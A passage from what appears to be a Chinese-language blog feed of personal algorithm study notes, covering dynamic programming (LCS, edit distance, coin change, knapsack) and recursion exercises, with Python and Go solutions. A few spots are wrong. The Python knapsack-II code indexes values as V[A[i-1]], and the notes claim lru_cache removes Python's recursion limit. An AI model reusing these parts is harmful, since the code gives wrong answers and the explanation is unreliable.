print()</span></span><br><span class="line">        <span class="keyword">return</span> max(dp)</span><br></pre></td></tr></table></figure>

<h1 id="3、应是双字符串类型（矩阵）-双序列类型（40-）"><a href="#3、应是双字符串类型（矩阵）-双序列类型（40-）" class="headerlink" title="3、应是双字符串类型（矩阵） 双序列类型（40%）"></a>3、应是双字符串类型（矩阵） <del>双序列类型</del>（40%）</h1><p>主要用于两个字符串的比较</p>
<p>两个字符串组成矩阵</p>
<h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p><a href="https://leetcode-cn.com/problems/longest-common-subsequence/" target="_blank" rel="noopener">1143. 最长公共子序列</a></p>
<p>和背包问题差不多，但是有些难想到</p>
<p>需要有动态规划的思维</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonSubsequence</span><span class="params">(self, text1: str, text2: str)</span> -&gt; int:</span></span><br><span class="line">        lenA=len(text1)</span><br><span class="line">        lenB=len(text2)</span><br><span class="line">        dp=[[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(lenB+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(lenA+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,lenA+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,lenB+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>]:</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j]=max(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[lenA][lenB]</span><br></pre></td></tr></table></figure>

<h2 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h2><p><a href="https://leetcode-cn.com/problems/edit-distance/" target="_blank" rel="noopener">编辑距离</a></p>
<p>给你两个单词 word1 和 word2，请你计算出将 word1 转换成 word2 所使用的最少操作数 。</p>
<p>你可以对一个单词进行如下三种操作：</p>
<ul>
<li>插入一个字符</li>
<li>删除一个字符</li>
<li>替换一个字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(self, word1: str, word2: str)</span> -&gt; int:</span></span><br><span class="line">        dp=[[j <span class="keyword">for</span> j <span class="keyword">in</span> range(len(word2)+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(word1)+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(word1)+<span class="number">1</span>): dp[i][<span class="number">0</span>]=i</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(word1)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,len(word2)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>]:</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">else</span>:			<span class="comment">#word1插入   word1删除      word1替换</span></span><br><span class="line">                    dp[i][j]=min(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+<span class="number">1</span></span><br><span class="line">                    <span class="comment"># print(dp[i][j])</span></span><br><span class="line">        <span class="keyword">return</span> dp[len(word1)][len(word2)]</span><br></pre></td></tr></table></figure>

<h1 id="4、零钱与背包"><a href="#4、零钱与背包" class="headerlink" title="4、零钱与背包"></a>4、零钱与背包</h1><h2 id="零钱兑换-⭐（虽说可用贪心，但要懂DP思路）"><a href="#零钱兑换-⭐（虽说可用贪心，但要懂DP思路）" class="headerlink" title="零钱兑换 ⭐（虽说可用贪心，但要懂DP思路）"></a>零钱兑换 ⭐（虽说可用贪心，但要懂DP思路）</h2><p>给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 -1。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: coins &#x3D; [1, 2, 5], amount &#x3D; 11</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 11 &#x3D; 5 + 5 + 1</span><br></pre></td></tr></table></figure>

<p>主要是用一个长度为amount的dp数组来做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins: List[int], amount: int)</span> -&gt; int:</span></span><br><span class="line">        dp=[amount+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>)]</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(coins)):</span><br><span class="line">                <span class="keyword">if</span> i-coins[j]&gt;=<span class="number">0</span>: <span class="comment">#如果可以用coins[j]</span></span><br><span class="line">                    dp[i]=min(dp[i],dp[i-coins[j]]+<span class="number">1</span>)<span class="comment">#找到满足dp[i]最少的硬币数</span></span><br><span class="line">        <span class="keyword">if</span> dp[amount]&gt;amount: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> dp[amount]</span><br></pre></td></tr></table></figure>

<p>其实直接贪心就好了，何必动态规划</p>
<ul>
<li>从大到小遍历coins，能装就装，装一个ans+1</li>
<li>最后判断target等不等于0</li>
</ul>
<h2 id="0-1背包问题（能装多少）-⭐"><a href="#0-1背包问题（能装多少）-⭐" class="headerlink" title="0-1背包问题（能装多少） ⭐"></a>0-1背包问题（能装多少） ⭐</h2><blockquote>
<p>在 n 个物品中挑选若干物品装入背包，最多能装多满？假设背包的大小为 m，每个物品的大小为 A[i]</p>
</blockquote>
<p>主要是要做一个矩阵，n个物品作为i , 背包大小m作为j</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">backPack</span> <span class="params">(m <span class="keyword">int</span>, A []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write your code here</span></span><br><span class="line">    <span class="comment">// f[i][j] 前i个物品，是否能装j</span></span><br><span class="line">    <span class="comment">// f[i][j] =f[i-1][j] f[i-1][j-a[i] j&gt;a[i]</span></span><br><span class="line">    <span class="comment">// f[0][0]=true f[...][0]=true</span></span><br><span class="line">    <span class="comment">// f[n][X]</span></span><br><span class="line">    f:=<span class="built_in">make</span>([][]<span class="keyword">bool</span>,<span class="built_in">len</span>(A)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;=<span class="built_in">len</span>(A);i++&#123;</span><br><span class="line">        f[i]=<span class="built_in">make</span>([]<span class="keyword">bool</span>,m+<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;=<span class="built_in">len</span>(A);i++&#123;</span><br><span class="line">        <span class="keyword">for</span> j:=<span class="number">0</span>;j&lt;=m;j++&#123;</span><br><span class="line">            f[i][j]=f[i<span class="number">-1</span>][j]</span><br><span class="line">            <span class="comment">// 首先是判断了背包大小j是否大于当前物品大小，然后判断了减去这个物品之后的背包下一个物品是否为真</span></span><br><span class="line">            <span class="keyword">if</span> j-A[i<span class="number">-1</span>]&gt;=<span class="number">0</span> &amp;&amp; f[i<span class="number">-1</span>][j-A[i<span class="number">-1</span>]]&#123; 《--重点，</span><br><span class="line">                f[i][j]=<span class="literal">true</span> 《--重点</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i:=m;i&gt;=<span class="number">0</span>;i--&#123;</span><br><span class="line">        <span class="keyword">if</span> f[<span class="built_in">len</span>(A)][i] &#123; <span class="comment">//最后在最后一行可以看到最多能装多满？</span></span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0-1背包-ii-最大价值"><a href="#0-1背包-ii-最大价值" class="headerlink" title="0-1背包-ii 最大价值"></a>0-1背包-ii 最大价值</h2><blockquote>
<p>有 <code>n</code> 个物品和一个大小为 <code>m</code> 的背包. 给定数组 <code>A</code> 表示每个物品的大小和数组 <code>V</code> 表示每个物品的价值. 问最多能装入背包的总价值是多大?</p>
</blockquote>
<p>思路：f[i] [j] 前 i 个物品，装入 j 背包 最大价值</p>
<p>做一个矩形的DP，然后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backPackII</span><span class="params">(m,A,V)</span>:</span></span><br><span class="line">    dp=[[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(m+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A)+<span class="number">1</span>)]    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(A)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,m+<span class="number">1</span>):</span><br><span class="line">            dp[i][j]=dp[i<span class="number">-1</span>][j]</span><br><span class="line">            <span class="keyword">if</span> j-A[i<span class="number">-1</span>]&gt;=<span class="number">0</span>: 《--重点</span><br><span class="line">            	dp[i][j]=max(dp[i<span class="number">-1</span>][j-A[i<span class="number">-1</span>]]+V[A[i<span class="number">-1</span>]],dp[i<span class="number">-1</span>][j]) 《--重点</span><br><span class="line">    <span class="keyword">return</span> dp[len(A)][m]</span><br></pre></td></tr></table></figure>

<p>go的版本</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">backPackII</span> <span class="params">(m <span class="keyword">int</span>, A []<span class="keyword">int</span>, V []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write your code here</span></span><br><span class="line">    <span class="comment">// f[i][j] 前i个物品，装入j背包 最大价值</span></span><br><span class="line">    <span class="comment">// f[i][j] =max(f[i-1][j] ,f[i-1][j-A[i]]+V[i]) 是否加入A[i]物品</span></span><br><span class="line">    <span class="comment">// f[0][0]=0 f[0][...]=0 f[...][0]=0</span></span><br><span class="line">    f:=<span class="built_in">make</span>([][]<span class="keyword">int</span>,<span class="built_in">len</span>(A)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(A)+<span class="number">1</span>;i++&#123;</span><br><span class="line">        f[i]=<span class="built_in">make</span>([]<span class="keyword">int</span>,m+<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;=<span class="built_in">len</span>(A);i++&#123;</span><br><span class="line">        <span class="keyword">for</span> j:=<span class="number">0</span>;j&lt;=m;j++&#123;</span><br><span class="line">            f[i][j]=f[i<span class="number">-1</span>][j]</span><br><span class="line">            <span class="keyword">if</span> j-A[i<span class="number">-1</span>] &gt;= <span class="number">0</span>&#123;</span><br><span class="line">                f[i][j]=max(f[i<span class="number">-1</span>][j],f[i<span class="number">-1</span>][j-A[i<span class="number">-1</span>]]+V[i<span class="number">-1</span>])</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[<span class="built_in">len</span>(A)][m]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a,b <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a&gt;b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="5、多序列类型"><a href="#5、多序列类型" class="headerlink" title="5、多序列类型"></a>5、多序列类型</h1><h2 id="5-1-双序列类型"><a href="#5-1-双序列类型" class="headerlink" title="5.1 双序列类型"></a>5.1 双序列类型</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProduct</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> nums==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        res=float(<span class="string">"-inf"</span>)</span><br><span class="line">        maxl=nums[<span class="number">0</span>]</span><br><span class="line">        minl=nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i]&lt;<span class="number">0</span>:</span><br><span class="line">                maxl,minl=minl,maxl</span><br><span class="line">            maxl=max(maxl*nums[i],nums[i]) <span class="comment">#不能是max(maxl*nums[i],maxl,nums[i])</span></span><br><span class="line">            minl=min(minl*nums[i],nums[i])</span><br><span class="line">            res=max(maxl,res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h1 id="6-最长回文子串"><a href="#6-最长回文子串" class="headerlink" title="6.最长回文子串"></a>6.最长回文子串</h1><p><a href="https://pic.leetcode-cn.com/1f95da43d1bdeebdd1213bb804034ddc5f906dc61451cd63f2b5ab5d0eb33b33-%E3%80%8C%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E3%80%8D%E9%97%AE%E9%A2%98%E6%80%9D%E8%80%83%E6%96%B9%E5%90%91.png" target="_blank" rel="noopener">动态规划推荐掌握</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s: str)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> len(s)&lt;<span class="number">2</span>:<span class="keyword">return</span> s</span><br><span class="line">        maxStart=<span class="number">0</span></span><br><span class="line">        maxEnd=<span class="number">0</span></span><br><span class="line">        maxLen=<span class="number">1</span></span><br><span class="line">        dp=[[<span class="literal">False</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s))] <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s))]</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> range(<span class="number">1</span>,len(s)):</span><br><span class="line">            <span class="keyword">for</span> left <span class="keyword">in</span> range(right):</span><br><span class="line">                <span class="keyword">if</span> s[left]==s[right] <span class="keyword">and</span> (left+<span class="number">2</span>&gt;=right <span class="keyword">or</span> dp[left+<span class="number">1</span>][right<span class="number">-1</span>]):</span><br><span class="line">                    dp[left][right]=<span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> maxLen&lt;right-left+<span class="number">1</span>:</span><br><span class="line">                        maxLen=right-left+<span class="number">1</span></span><br><span class="line">                        maxStart=left</span><br><span class="line">                        maxEnd=right</span><br><span class="line">        <span class="keyword">return</span> s[maxStart:maxEnd+<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1><h2 id="剪绳子-1"><a href="#剪绳子-1" class="headerlink" title="剪绳子-1"></a>剪绳子-1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        res=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        res[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i//<span class="number">2</span>+<span class="number">1</span>):</span><br><span class="line">                res[i]=max(res[i],max(j,res[j])*max(i-j,res[i-j]))</span><br><span class="line">        print(res)</span><br><span class="line">        <span class="keyword">return</span> res[n]</span><br></pre></td></tr></table></figure>

<h2 id="剪绳子-2"><a href="#剪绳子-2" class="headerlink" title="剪绳子-2"></a>剪绳子-2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        opt=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        opt[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i//<span class="number">2</span>+<span class="number">1</span>):</span><br><span class="line">                opt[i]=max(opt[i],max(opt[j],j)*max(opt[i-j],i-j))</span><br><span class="line">        <span class="keyword">return</span> opt[n]%<span class="number">1000000007</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 递归练习</title>
    <url>/2020/08/02/2020-08-02-Recursive-1/</url>
    <content><![CDATA[<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="递归深度过深出错-超出时间限制"><a href="#递归深度过深出错-超出时间限制" class="headerlink" title="递归深度过深出错(超出时间限制)"></a>递归深度过深出错(超出时间限制)</h2><p>如果提醒递归深度过深出错</p>
<p>就用如下的代码更改限制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span> </span><br><span class="line"><span class="meta">    @functools.lru_cache(maxsize=512)</span></span><br></pre></td></tr></table></figure>

<h2 id="PS-为什么要模1000000007"><a href="#PS-为什么要模1000000007" class="headerlink" title="PS : 为什么要模1000000007"></a>PS : 为什么要模1000000007</h2><p>（跟我念，一，八个零，七）。参考<a href="https://www.liuchuo.net/archives/645" target="_blank" rel="noopener">https://www.liuchuo.net/archives/645</a></p>
<ol>
<li>大数相乘，大数的排列组合等为什么要取模</li>
</ol>
<ul>
<li>1000000007是一个质数（素数），对质数取余能最大程度避免结果冲突/重复</li>
<li>int32位的最大值为2147483647，所以对于int32位来说1000000007足够大。</li>
<li>int64位的最大值为2^63-1，用最大值模1000000007的结果求平方，不会在int64中溢出。</li>
<li>所以在大数相乘问题中，因为(a∗b)%c=((a%c)∗(b%c))%c，所以相乘时两边都对1000000007取模，再保存在int64里面不会溢出。</li>
</ul>
<ol>
<li>这道题为什么要取模，取模前后的值不就变了吗？</li>
</ol>
<ul>
<li>确实：取模前 f(43) = 701408733, f(44) = 1134903170, f(45) = 1836311903, 但是 f(46) &gt; 2147483647结果就溢出了。</li>
<li>_____，取模后 f(43) = 701408733, f(44) = 134903163 , f(45) = 836311896, f(46) = 971215059没有溢出。</li>
<li>取模之后能够计算更多的情况，如 f(46)</li>
<li>这道题的测试答案与取模后的结果一致。</li>
<li>总结一下，这道题要模1000000007的根本原因是标准答案模了1000000007。不过大数情况下为了防止溢出，模1000000007是通用做法，原因见第一点。</li>
</ul>
<h1 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseString</span><span class="params">(self, s: List[str])</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Do not return anything, modify s in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=len(s)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            s[i],s[j]=s[j],s[i]</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">    <span class="comment">#     result=[]</span></span><br><span class="line">    <span class="comment">#     self.reverse(s,result,0)</span></span><br><span class="line">    <span class="comment">#     print(result)</span></span><br><span class="line">    <span class="comment">#     s=result.copy() #这样子是不算改s的</span></span><br><span class="line">    <span class="comment">#     # print(s)</span></span><br><span class="line">    <span class="comment"># def reverse(self,s,result,index):</span></span><br><span class="line">    <span class="comment">#     if index==len(s): return</span></span><br><span class="line">    <span class="comment">#     self.reverse(s,result,index+1)</span></span><br><span class="line">    <span class="comment">#     result.append(s[index])</span></span><br></pre></td></tr></table></figure>

<h1 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h1><p>虽然简单，但是也花了时间调，主要是因为递归的时候，python中递归会超出最大的长度，需要用 <code>@functools.lru_cache(maxsize=512)</code> 来关闭限制。</p>
<p><strong>迭代型</strong>：需要做好初值：res[0] , res[1] ，一般都需要两个初值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="meta">    @functools.lru_cache(maxsize=512)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;<span class="number">2</span>: <span class="keyword">return</span> n <span class="comment">#递归型</span></span><br><span class="line">        <span class="keyword">return</span> (self.fib(n<span class="number">-1</span>) + self.fib(n<span class="number">-2</span>))%<span class="number">1000000007</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># res=[i for i in range(n+1)] #迭代型</span></span><br><span class="line">        <span class="comment"># for i in range(2,n+1): res[i]=(res[i-1]+res[i-2])%1000000007</span></span><br><span class="line">        <span class="comment"># return res[n]</span></span><br></pre></td></tr></table></figure>

<h1 id="跳台阶-ii"><a href="#跳台阶-ii" class="headerlink" title="跳台阶-ii"></a>跳台阶-ii</h1><p>用迭代型，还是要做好两个初值：res[1]、res[2]</p>
<p>PS：当台阶为零时，值为1 <code>？？</code> 这个特殊情况，我们不算在两个初值中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        res=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        res[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">        res[<span class="number">2</span>]=<span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            res[i]=(res[i<span class="number">-1</span>]+res[i<span class="number">-2</span>])%<span class="number">1000000007</span></span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> res[n]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="meta">    @functools.lru_cache(maxsize=512)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> (self.numWays(n<span class="number">-1</span>)+self.numWays(n<span class="number">-2</span>))%<span class="number">1000000007</span></span><br></pre></td></tr></table></figure>

<h1 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h1><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/submissions/" target="_blank" rel="noopener">两两交换链表中的节点</a></p>
<p>主要要用tmp把暂时无关的节点存好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swapPairs</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next: <span class="keyword">return</span> head</span><br><span class="line">        tmpnext=head.next.next</span><br><span class="line">        tmp=head.next</span><br><span class="line">        tmp.next=head</span><br><span class="line">        head.next=self.swapPairs(tmpnext)</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure>



<h1 id="不同的二叉搜索树-ii"><a href="#不同的二叉搜索树-ii" class="headerlink" title="不同的二叉搜索树-ii"></a>不同的二叉搜索树-ii</h1><p>给定一个整数 <em>n</em>，生成所有由 1 … <em>n</em> 为节点所组成的 <strong>二叉搜索树</strong> 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line"></span><br><span class="line">输入：3</span><br><span class="line">输出：</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">解释：</span><br><span class="line">以上的输出对应以下 5 种不同结构的二叉搜索树：</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       &#x2F;     &#x2F;      &#x2F; \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    &#x2F;     &#x2F;       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure>

<p>主要是</p>
<ul>
<li>遍历选取不同的根节点</li>
<li>然后递归获得左子树的根节点数组，右子树的根节点数组</li>
<li>然后创建根节点，遍历左右子树两个for循环，连上根节点，添加到list中</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generateTrees</span><span class="params">(self, n: int)</span> -&gt; List[TreeNode]:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.helper(<span class="number">1</span>,n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(self,start,end)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> start&gt;end: <span class="keyword">return</span> [TreeNode(<span class="literal">None</span>)] <span class="comment">#这里要注意</span></span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end+<span class="number">1</span>): <span class="comment">#从零开始遍历</span></span><br><span class="line">            left=self.helper(start,i<span class="number">-1</span>)</span><br><span class="line">            right=self.helper(i+<span class="number">1</span>,end)</span><br><span class="line">            <span class="keyword">for</span> leftNode <span class="keyword">in</span> left: <span class="comment">#遍历左节点</span></span><br><span class="line">                <span class="keyword">for</span> rightNode <span class="keyword">in</span> right: <span 